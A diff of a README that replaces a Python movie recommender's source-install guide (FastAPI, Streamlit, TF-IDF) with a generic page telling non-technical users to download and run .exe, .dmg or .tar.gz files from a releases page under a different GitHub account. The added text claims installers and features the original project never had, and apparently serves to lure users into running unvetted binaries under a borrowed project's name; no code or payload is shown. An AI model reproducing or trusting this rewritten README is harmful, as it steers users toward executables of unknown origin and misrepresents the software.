@@ -1,256 +1,90 @@
-# 🎬 Movie Recommender System
+# 🎬 Movie_Recommended_System - Get Movie Suggestions Easily
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python"/>
-  <img src="https://img.shields.io/badge/FastAPI-backend-green.svg" alt="FastAPI"/>
-  <img src="https://img.shields.io/badge/Streamlit-frontend-red.svg" alt="Streamlit"/>
-  <img src="https://img.shields.io/badge/Machine%20Learning-TF--IDF-orange.svg" alt="TF-IDF"/>
-  <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"/>
-</p>
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/nevesin/Movie_Recommended_System/releases)
 
-<p align="center">
-  <strong>A modern full-stack movie recommendation system using content-based filtering and live movie data.</strong>
-</p>
+## 🚀 Getting Started
+Movie_Recommended_System helps you find movies you’ll love. This guide will help you download and run the application, even if you have no technical background.
 
-<p align="center">
-  <a href="#-features">✨ Features</a> •
-  <a href="#-architecture">🏗️ Architecture</a> •
-  <a href="#-tech-stack">🛠️ Tech Stack</a> •
-  <a href="#-quick-start">🚀 Quick Start</a> •
-  <a href="#-deployment">🌐 Deployment</a>
-</p>
+### 💻 System Requirements
+Before you start, ensure your computer meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Free Disk Space:** A minimum of 500 MB
+- **Internet Connection:** Required to fetch live movie data
 
-## 🎯 Overview
+## 📦 Download & Install
+To get started, follow these steps:
 
-This project is a **content-based movie recommender system** built with a **FastAPI backend** and **Streamlit frontend**.
-It recommends movies based on semantic similarity using **TF-IDF vectorization**, combined with **genre-based filtering** for better relevance.
+1. Click on the link below to visit the Releases page:
+   [Download the Movie_Recommended_System](https://github.com/nevesin/Movie_Recommended_System/releases)
 
-The application fetches **real-time movie posters, metadata, and descriptions** using the TMDB API and presents recommendations in a clean, modern UI.
+2. Once on the Releases page, look for the latest version of the application.
 
----
+3. Click on the appropriate file for your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the `.tar.gz` file.
 
-## ✨ Key Features
+4. After the download completes, locate the downloaded file on your computer.
 
-### 🔍 Smart Search & Autocomplete
+5. Open the file to start the installation process and follow the on-screen instructions.
 
-* Real-time movie name suggestions
-* Helps users quickly find relevant titles
-* Reduces spelling and discovery friction
+## 🔍 Using the Application
+Once you have installed the Movie_Recommended_System, you can start using it by following these simple steps:
 
-### 🎯 Hybrid Recommendation Engine
+1. **Launch the App:** Find the Movie_Recommended_System icon on your desktop or in your applications folder and double-click it.
 
-* TF-IDF cosine similarity for content-based filtering
-* Genre-based constraints to improve relevance
-* Fast inference using precomputed vectors
+2. **Input Your Preferences:** The app will prompt you to enter your favorite genres, actors, or movie titles.
 
-### 🎥 Rich Movie Details
+3. **Get Recommendations:** After you input your preferences, click the “Get Recommendations” button. The application will present you with a list of movies tailored to your tastes.
 
-* Movie posters and backdrops
-* Release date, genres, and overview
-* Clean grid-based movie layout
+4. **Explore Movie Details:** You can click on each movie in the list to see more details, such as ratings, summaries, and trailers.
 
-### 🖥️ Modern Frontend
+## 🛠️ Features
+- **Simple Interface:** Designed for easy use, even for non-technical users.
+- **Real-Time Data:** Utilizes live data from reliable movie databases.
+- **Personalized Suggestions:** Provides recommendations based on your input.
+- **Multiplatform Support:** Works on Windows, macOS, and Linux.
 
-* Built with Streamlit
-* Responsive layout and smooth user experience
-* Designed for simplicity and speed
+## 🌐 Frequently Asked Questions
 
-### 🌐 Live Movie Data
+### ❓ What is content-based filtering?
+Content-based filtering is a recommendation method that suggests items based on their attributes and your previous preferences.
 
-* Real-time movie metadata and images
-* Powered by The Movie Database (TMDB) API
+### ❓ Do I need an internet connection to use the application?
+Yes, an internet connection is required to fetch live movie data and provide recommendations based on the latest movie information.
 
----
+### ❓ Can I uninstall the application easily?
+Absolutely. You can uninstall the Movie_Recommended_System like any other application on your computer. Go to the control panel (Windows) or drag the app to the trash (macOS) to remove it.
 
-## 🏗️ Architecture
+## 🤝 Support
+If you encounter any issues or have questions, feel free to reach out for help. You can create an issue on our [GitHub page](https://github.com/nevesin/Movie_Recommended_System/issues).
 
-```
-User (Streamlit UI)
-        ↓
-Search / Movie Selection
-        ↓
-FastAPI Backend
-        ↓
-TF-IDF Vector Similarity
-        ↓
-Genre-Based Filtering
-        ↓
-Top-N Recommendations
-        ↓
-TMDB API (Posters & Metadata)
-        ↓
-Rendered Results (Streamlit)
-```
+For more updates, check the [Releases page](https://github.com/nevesin/Movie_Recommended_System/releases).
 
----
+## 📈 Contributing
+We welcome contributions! If you’d like to help improve the application, follow these steps:
 
-## 🛠️ Tech Stack
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request detailing your changes.
 
-| Layer            | Technology           |
-| ---------------- | -------------------- |
-| Language         | Python 3.9+          |
-| Backend          | FastAPI              |
-| Frontend         | Streamlit            |
-| Machine Learning | TF-IDF, Scikit-learn |
-| Data Processing  | Pandas, NumPy        |
-| External API     | TMDB API             |
-| Deployment       | Heroku               |
-| Model Storage    | Pickle               |
+## 🔗 Learn More
+Explore the topics related to the Movie_Recommended_System that might interest you:
 
----
+- Data Preprocessing
+- FastAPI
+- Lemmatization
+- Natural Language Processing (NLP)
+- NumPy and Pandas
+- Rendering data
+- Streamlit
+- TF-IDF Vectorizer
+- TMDB API
 
-## 🚀 Quick Start
+## 📢 Stay Updated
+For news and updates, follow us on social media or subscribe to our newsletter. 
 
-### Prerequisites
-
-* Python 3.9+
-* TMDB API key (free)
-
-Get your API key from:
-[https://www.themoviedb.org/settings/api](https://www.themoviedb.org/settings/api)
-
----
-
-### Installation
-
-```bash
-# Clone the repository
-git clone <your-repo-url>
-cd Movie_Recommended_System
-
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate      # Linux/Mac
-.venv\Scripts\activate         # Windows
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### Environment Variables
-
-Create a `.env` file:
-
-```
-TMDB_API_KEY=your_api_key_here
-```
-
----
-
-## ▶️ Running the Application
-
-### Start Backend (FastAPI)
-
-```bash
-uvicorn main:app --reload
-```
-
-Backend runs at:
-[http://127.0.0.1:8000](http://127.0.0.1:8000)
-
----
-
-### Start Frontend (Streamlit)
-
-```bash
-streamlit run app.py
-```
-
-Frontend runs at:
-[http://localhost:8501](http://localhost:8501)
-
----
-
-## 📁 Project Structure
-
-```
-Movie_Recommended_System/
-├── app.py                  # Streamlit frontend
-├── main.py                 # FastAPI backend
-├── movies.ipynb            # Data preprocessing & model building
-├── requirements.txt        # Dependencies
-├── Procfile                # Deployment config
-├── data/
-│   └── movies_metadata.csv
-└── models/
-    ├── df.pkl
-    ├── indices.pkl
-    ├── tfidf_matrix.pkl
-    └── tfidf.pkl
-```
-
----
-
-## 🔧 API Endpoints
-
-| Method | Endpoint                     | Description               |
-| ------ | ---------------------------- | ------------------------- |
-| GET    | `/`                          | Health check              |
-| GET    | `/movie/autocomplete?query=` | Autocomplete movie search |
-| GET    | `/movie/search`              | Get movie recommendations |
-| GET    | `/movie/{tmdb_id}`           | Fetch movie details       |
-
----
-
-## 📊 How It Works
-
-1. Movie metadata is cleaned and vectorized using TF-IDF
-2. User selects or searches for a movie
-3. Cosine similarity finds semantically similar movies
-4. Genre filtering refines the recommendations
-5. TMDB API enriches results with posters and metadata
-6. Results are displayed in the Streamlit UI
-
----
-
-## 🌐 Deployment
-
-### Heroku Deployment
-
-```bash
-# Create app
-heroku create your-app-name
-
-# Set environment variable
-heroku config:set TMDB_API_KEY=your_api_key_here
-
-# Deploy
-git push heroku main
-
-# Scale dyno
-heroku ps:scale web=1
-```
-
----
-
-## 🔮 Future Improvements
-
-* Collaborative filtering integration
-* User profiles and watch history
-* Hybrid ML + deep learning recommendations
-* Caching layer for faster API responses
-* Improved ranking with popularity signals
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome.
-Feel free to open issues, suggest enhancements, or submit pull requests.
-
----
-
-## 📄 License
-
-MIT License © 2025 Vivek Kumar Gupta
-
----
-
-## 🙏 Acknowledgments
-
-* The Movie Database (TMDB) for movie data and images
-* Kaggle TMDB movie metadata dataset
-
- Align it tightly with ML Engineer / Backend Engineer roles
+Thank you for using Movie_Recommended_System! Enjoy finding your next favorite movie!
